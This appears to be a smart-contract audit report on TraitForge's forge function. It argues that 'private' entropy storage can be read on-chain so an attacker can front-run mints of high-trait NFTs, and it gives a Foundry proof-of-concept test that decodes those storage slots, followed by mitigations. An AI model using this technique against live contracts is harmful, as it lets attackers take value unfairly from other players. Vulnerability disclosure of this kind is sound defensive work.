# Vulnerability details

## Summary

The [TraitForgeNft.sol::forge](https://github.com/code-423n4/2024-07-traitforge/blob/279b2887e3d38bc219a05d332cbcb0655b2dc644/contracts/TraitForgeNft/TraitForgeNft.sol#L153-L179) function is vulnerable to front-running attacks. Malicious actors can read NFT traits from the blockchain and mint NFTs with the highest traits, exploiting the protocol’s reliance on private variables for storing NFT stats and the last forged (minted) NFT. Although these variables are assumed to be private, the data can be accessed via the blockchain, enabling attackers to gain Maximum Extractable Value (MEV).

Allowing the attacker to gain MEV.

https://quillaudits.medium.com/accessing-private-data-in-smart-contracts-quillaudits-fe847581ce6d

## Vulnerability Details

The vulnerability arises when NFT stats/traits are written into EntropyGenerator#entropySlots, a private variable.
Despite being private, the NFT stats can be read from the blockchain. Attackers can use this information to mint NFTs with the highest traits.

The [EntropyGenerator::getPublicEntropy](https://github.com/code-423n4/2024-07-traitforge/blob/279b2887e3d38bc219a05d332cbcb0655b2dc644/contracts/EntropyGenerator/EntropyGenerator.sol#L101-L120) function allows verification of the NFT's
position by returning the entropy at a specified position. Attackers can monitor the`EntropyGenerator::slotIndexSelectionPoint`, `numberIndexSelectionPoint`, `currentSlotIndex`, `currentNumberIndex` read and decode the private variables from the blockchain to identify when the desired high-value NFT will be forgeable.

By front-running the forge function, attackers can always mint the NFT with the highest traits.

## Proof of Concept
The following PoC test show how a malicious actor can read the array data written in Foundry. The test can be ran by bootstrapping the project with Foundry and the following command to see the needed logs:

`forge test --mt test_frontRunningPerfectEntropies -vv`

```solidity
contract EntropyGeneratorTest is Test {

    EntropyGenerator public entropyGenerator;

    function setUp() public {
        entropyGenerator = new EntropyGenerator(address(this));
    }

    function test_frontRunningPerfectEntropies() public {
        vm.prank(address(this));
        entropyGenerator.writeEntropyBatch1();
        entropyGenerator.writeEntropyBatch2();
        entropyGenerator.writeEntropyBatch3();

        address contractAddress = address(entropyGenerator);

        uint256 baseSlot = 0;

        uint24[770 * 13] memory entropyValues; // 770 slots with 13 entropies each

        // Read and decode entropy values directly from storage
        for (uint256 i; i < 770; ++i) {
            // Load value from storage slot (baseSlot + i)
            bytes32 slotData = vm.load(contractAddress, bytes32(baseSlot + i));

            uint256 data = uint256(slotData);

            // Extract and store the 13 entropy values from this slot
            for (uint256 j; j < 13; ++j) {
                uint24 entropy = extractUint24(data, j);
                entropyValues[i * 13 + j] = entropy;

                console.log(entropy);
            }
        }

        uint24 highestEntropy = findHighestEntropy(entropyValues);

        console.log("Highest Entropy Value:", highestEntropy);

        uint24 perfectEntropy = 999999; // Example perfect value

        bool foundPerfectEntropy = false;
        for (uint256 i; i < entropyValues.length; ++i) {
            if (entropyValues[i] == perfectEntropy) {
                foundPerfectEntropy = true;
                break;
            }
        }

// This can be uncommented to check if the perfect entropy value is found
// note that the batches are not ensuring that the perfect entropy value will be generated
// exactly at the third batch. As the documentation clearly states that the game can continue ideally forever
//        assertTrue(foundPerfectEntropy, "Perfect entropy value not found!");
    }

    function extractUint24(uint256 data, uint256 index) internal pure returns (uint24) {
        return uint24(data / (10**(6 * index)) % 10**6);
    }

    function findHighestEntropy(uint24[770 * 13] memory entropyValues) internal pure returns (uint24) {
        uint24 highest = 0;
        for (uint256 i; i < entropyValues.length; ++i) {
            if (entropyValues[i] > highest) {
                highest = entropyValues[i];
            }
        }
        return highest;
    }
}
```

## Impact

Players can be front-run by a malicious actor to mint NFTs with the highest traits, leading to an unfair
advantage and potential financial losses.

## Tools Used

Manual Review, Foundry

## Recommended Mitigation Steps

Since all data on the blockchain is public, sensitive information should be stored using additional encryption or off-chain solutions. Specifically, NFT stats should be stored off-chain, with only the hash of the stats stored on-chain. The stats should be revealed only when the NFT is minted, preventing attackers from reading and exploiting this information.

Alternatively, consider using Chainlink VRF to generate NFT stats at the time of minting, rather than generating them beforehand.
